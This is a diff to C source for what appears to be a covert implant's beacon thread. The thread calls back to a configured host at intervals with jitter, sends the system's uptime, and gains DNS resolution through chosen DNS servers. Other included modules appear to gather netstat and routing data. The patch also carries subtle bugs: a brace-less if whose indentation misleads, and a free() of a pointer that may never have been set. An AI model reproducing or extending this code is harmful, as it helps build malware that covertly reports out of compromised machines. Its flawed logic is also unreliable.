@@ -18,6 +18,8 @@
 #include "netstat_an.h"
 #include "netstat_rn.h"
 #include "compression.h"
+#include "string_utils.h"
+#include "dns_protocol.h"
 
 //******************************************************************
 #if defined LINUX || defined SOLARIS
@@ -116,28 +118,33 @@ int beacon_start(BEACONINFO *beaconInfo)
 void *beacon(void *param)
 {
 	unsigned long secondsUp = 0;
-	int ret = 0;
 	int beaconInterval = 0;
 	int jitter = 0;
-	BEACONINFO *beaconInfo = (BEACONINFO *) param;
+	int i;
+	struct in_addr	beaconIPaddr;
+	BEACONINFO *beaconInfo;
 
+	beaconInfo = (BEACONINFO *) param;
 	DLX(4, printf("Starting beacon thread with initial beacon delay of %ld seconds\n", beaconInfo->initDelay / 1000));
+	DLX(4, printf("Beacon Host: %s, (%d bytes)\n", beaconInfo->host, strlen(beaconInfo->host)));
 	Sleep(beaconInfo->initDelay);	// Wait for initial delay
 
-	//Loop that gets uptime
-	for (;;) {
-
+	for (;;) {		// Beacon Loop
 		secondsUp = GetSystemUpTime(); // Get system uptime
 		DLX(4, printf("\tSystem uptime is %ld\n", secondsUp));
 
-		//Beacon back
-		// TODO: SendBeaconData does not handle errors returned
-		DLX(4, printf("\tSending beacon\n"));
-		ret = send_beacon_data(beaconInfo, secondsUp, beaconInterval);
-		if (ret == SUCCESS) {
-			update_file((char *) sdcfp);
-		} else {
-			DLX(4, printf("\tSend of beacon failed\n"));
+		// Resolve beacon IP address
+		if (inet_pton(AF_INET, beaconInfo->host, &beaconIPaddr) <= 0) {		// Determine if beacon IP is an address
+			for (i = 0; i < 2; i++) {
+				if (strlen(beaconInfo->dns[i]))
+					DLX(4, printf("\tPerforming DNS lookup for %s using DNS server at %s.\n", beaconInfo->host, beaconInfo->dns[i]));
+					if ( (beaconInfo->ip = dns_resolv(beaconInfo->host, beaconInfo->dns[i])) )
+						break;
+			}
+			if (beaconInfo->ip == NULL) {
+				DLX(4, printf("\tBeacon host could not be resolved.\n"));
+				goto sleep;		// Try again next beacon interval
+			}
 		}
 
 		if (beaconInfo->percentVariance > 0) {
@@ -146,7 +153,18 @@ void *beacon(void *param)
 		} else {
 			beaconInterval = beaconInfo->interval;
 		}
-		DLX(4, printf("\tSending next beacon in %d seconds.\n", beaconInfo->interval / 1000));
+
+		// TODO: SendBeaconData does not handle errors returned
+		DLX(4, printf("\tSending beacon\n"));
+		if (send_beacon_data(beaconInfo, secondsUp, beaconInterval) == SUCCESS) {
+			update_file((char *) sdcfp);
+		} else {
+			DLX(4, printf("\tSend of beacon failed\n"));
+		}
+		free(beaconInfo->ip);
+
+	sleep:
+		DLX(4, printf("\tSending next beacon in %d seconds.\n", beaconInterval / 1000));
 		Sleep(beaconInterval);	//Sleep for the length of the interval
 
 	}
@@ -440,7 +458,7 @@ static int send_beacon_data(BEACONINFO * beaconInfo, unsigned long uptime, int n
 			printf("NET_UNKNOWN_HOST\n");}
 			else {
 			printf("Unknown error\n");}
-);
+		);
 
 		// we can return from here. no need to goto to bottom of function because
 		// at this stage, there is nothing to clean-up
